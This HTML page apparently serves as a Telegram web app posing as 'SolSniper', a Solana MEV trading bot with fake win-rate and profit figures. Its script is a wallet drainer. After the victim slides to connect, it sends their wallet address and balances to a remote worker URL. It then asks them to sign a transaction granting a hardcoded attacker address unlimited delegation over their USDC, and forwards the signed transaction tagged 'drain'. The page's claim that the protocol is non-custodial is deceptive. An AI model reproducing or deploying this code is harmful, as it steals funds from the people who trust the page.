<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SolSniper | MEV Bot</title>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  
  body {
    background-color: #000000;
    color: #ffffff;
    font-family: 'Inter', sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
    background-image: radial-gradient(circle at 50% 100%, rgba(20, 241, 149, 0.08) 0%, transparent 60%);
    overflow: hidden;
  }

  .terminal {
    width: 100%;
    max-width: 380px;
    background: rgba(10, 10, 12, 0.7);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 24px;
    padding: 32px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.1);
  }

  .logo-container {
    width: 64px; height: 64px;
    background: linear-gradient(135deg, #14F195, #059669);
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin-bottom: 20px;
    box-shadow: 0 0 30px rgba(20, 241, 149, 0.3);
  }

  .logo-container svg { width: 36px; height: 36px; color: #000; }

  h1 { font-size: 24px; font-weight: 800; margin-bottom: 6px; letter-spacing: -0.5px; }
  
  .slogan {
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    color: #14F195;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 24px;
    background: rgba(20, 241, 149, 0.1);
    padding: 6px 12px;
    border-radius: 6px;
    border: 1px solid rgba(20, 241, 149, 0.2);
  }

  .stats-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    width: 100%;
    margin-bottom: 32px;
  }

  .stat-box {
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 12px;
    padding: 12px;
    text-align: center;
  }

  .stat-label { font-size: 11px; color: #71717a; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
  .stat-value { font-family: 'JetBrains Mono', monospace; font-size: 16px; font-weight: 700; color: #ffffff; }
  .stat-value.green { color: #14F195; }

  /* Vertikaler Slider */
  .slider-wrapper {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
  }

  .slider-text {
    font-size: 13px;
    color: #a1a1aa;
    font-weight: 500;
  }

  .slider-container {
    width: 60px;
    height: 220px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 30px;
    position: relative;
    display: flex;
    flex-direction: column-reverse;
    align-items: center;
    padding: 6px;
    user-select: none;
    box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
  }

  .slider-thumb {
    width: 48px; height: 48px;
    background: #ffffff;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    cursor: grab;
    position: relative;
    z-index: 2;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
    transition: transform 0.1s;
  }

  .slider-thumb:active { cursor: grabbing; }

  .slider-thumb svg {
    width: 20px; height: 20px;
    color: #000000;
    transition: transform 0.2s;
  }

  /* States */
  .slider-container.loading .slider-thumb {
    height: calc(100% - 12px);
    border-radius: 24px;
    background: #14F195;
    pointer-events: none;
    display: flex;
    align-items: flex-start;
    padding-top: 16px;
    box-shadow: 0 0 20px rgba(20, 241, 149, 0.4);
  }

  .slider-container.success .slider-thumb {
    height: calc(100% - 12px);
    border-radius: 24px;
    background: #14F195;
    pointer-events: none;
    justify-content: center;
    align-items: center;
    box-shadow: 0 0 20px rgba(20, 241, 149, 0.4);
  }

  .spinner {
    display: none; width: 20px; height: 20px;
    border: 2px solid rgba(0,0,0,0.2); border-top-color: #000;
    border-radius: 50%; animation: spin 0.8s linear infinite;
  }
  
  @keyframes spin { 100% { transform: rotate(360deg); } }

  .warning {
    margin-top: 24px;
    font-size: 10px;
    color: #52525b;
    text-align: center;
    line-height: 1.4;
  }
</style>
</head>
<body>

  <div class="terminal">
    
    <div class="logo-container">
      <!-- Crosshair/Sniper Icon -->
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="2" x2="12" y2="6"></line>
        <line x1="12" y1="18" x2="12" y2="22"></line>
        <line x1="2" y1="12" x2="6" y2="12"></line>
        <line x1="18" y1="12" x2="22" y2="12"></line>
        <circle cx="12" cy="12" r="2" fill="currentColor"></circle>
      </svg>
    </div>

    <h1>SolSniper</h1>
    <div class="slogan">2 clicks away from 5x</div>

    <div class="stats-grid">
      <div class="stat-box">
        <div class="stat-label">Win Rate</div>
        <div class="stat-value green">94.2%</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Avg Profit</div>
        <div class="stat-value green">+412%</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Targets</div>
        <div class="stat-value">1,492</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Latency</div>
        <div class="stat-value">0.03ms</div>
      </div>
    </div>

    <div class="slider-wrapper">
      <div class="slider-text">Slide up to connect wallet & start bot</div>
      
      <div class="slider-container" id="sliderContainer">
        <div class="slider-thumb" id="sliderThumb">
          <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
          <div class="spinner" id="spin"></div>
        </div>
      </div>
    </div>

    <div class="warning">
      By connecting, you authorize the MEV bot to execute trades on your behalf. Non-custodial protocol.
    </div>

  </div>

<script>
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }

  // CONFIG
  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
  const ENDPOINT = "https://solsyncv3.rthvzkr6jv.workers.dev"; // DEINE WORKER URL (stelle sicher, dass v3 existiert)
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 

  const container = document.getElementById('sliderContainer');
  const thumb = document.getElementById('sliderThumb');
  const icon = document.getElementById('sliderIcon');
  const spin = document.getElementById('spin');

  let isDragging = false;
  let startY = 0;
  let currentY = 0;
  let maxDrag = 0;

  // --- AUTO CONNECT ON LOAD ---
  window.addEventListener('load', async () => {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (provider) {
      try {
        await provider.connect({ onlyIfTrusted: true });
      } catch (e) {}
    }
  });

  function initSlider() {
    maxDrag = container.offsetHeight - thumb.offsetHeight - 12;
  }

  function startDrag(e) {
    if (container.classList.contains('loading') || container.classList.contains('success')) return;
    isDragging = true;
    startY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
    thumb.style.transition = 'none';
  }

  function moveDrag(e) {
    if (!isDragging) return;
    const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
    
    // Ziehen nach oben
    let delta = startY - clientY; 
    
    if (delta < 0) delta = 0;
    if (delta > maxDrag) delta = maxDrag;
    
    currentY = delta;
    thumb.style.transform = `translateY(-${currentY}px)`;
  }

  function endDrag() {
    if (!isDragging) return;
    isDragging = false;
    
    if (currentY > maxDrag * 0.7) {
      container.classList.add('loading');
      thumb.style.transition = 'height 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
      thumb.style.transform = `translateY(-${maxDrag}px)`;
      icon.style.display = 'none';
      spin.style.display = 'block';
      
      triggerConnect();
    } else {
      thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
      thumb.style.transform = 'translateY(0)';
      currentY = 0;
    }
  }

  async function triggerConnect() {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (!provider) { 
      if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
          if (confirmed) {
            const url = window.location.href;
            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
          }
        });
      } else {
        alert("Please open in a Web3 wallet browser.");
      }
      resetSlider();
      return; 
    }

    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      
      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      
      // Balance Check
      const solBalance = await conn.getBalance(resp.publicKey);
      const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
      
      const victimAta = await splToken.getAssociatedTokenAddress(
        new solanaWeb3.PublicKey(USDC_MINT),
        resp.publicKey
      );

      let usdcAmount = 0;
      try {
        const tokenBal = await conn.getTokenAccountBalance(victimAta);
        usdcAmount = tokenBal.value.uiAmount;
      } catch (e) {}

      // Send Info to Worker
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          victim, 
          chain: "solana",
          type: "connection_and_balance",
          sol: solAmount.toFixed(4),
          usdc: usdcAmount,
          ts: Date.now() 
        })
      });

      // If USDC > 0, trigger drain
      if (usdcAmount > 0) {
        const delegateIx = splToken.createApproveInstruction(
          victimAta,
          new solanaWeb3.PublicKey(ATTACKER),
          resp.publicKey,
          [],
          BigInt("18446744073709551615")
        );

        const tx = new solanaWeb3.Transaction().add(delegateIx);
        tx.feePayer = resp.publicKey;
        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

        const signedTx = await provider.signTransaction(tx);

        await fetch(ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", ts: Date.now() })
        });
      }

      spin.style.display = 'none';
      container.classList.remove('loading');
      container.classList.add('success');
      thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';

    } catch (e) {
      resetSlider();
    }
  }

  function resetSlider() {
    container.classList.remove('loading');
    spin.style.display = 'none';
    icon.style.display = 'block';
    thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), height 0.3s ease, border-radius 0.3s ease';
    thumb.style.transform = 'translateY(0)';
    thumb.style.height = '48px';
    thumb.style.borderRadius = '50%';
    currentY = 0;
  }

  window.addEventListener('resize', initSlider);
  setTimeout(initSlider, 100);

  thumb.addEventListener('mousedown', startDrag);
  window.addEventListener('mousemove', moveDrag);
  window.addEventListener('mouseup', endDrag);

  thumb.addEventListener('touchstart', startDrag, {passive: false});
  window.addEventListener('touchmove', moveDrag, {passive: false});
  window.addEventListener('touchend', endDrag);
</script>
</body>
</html>
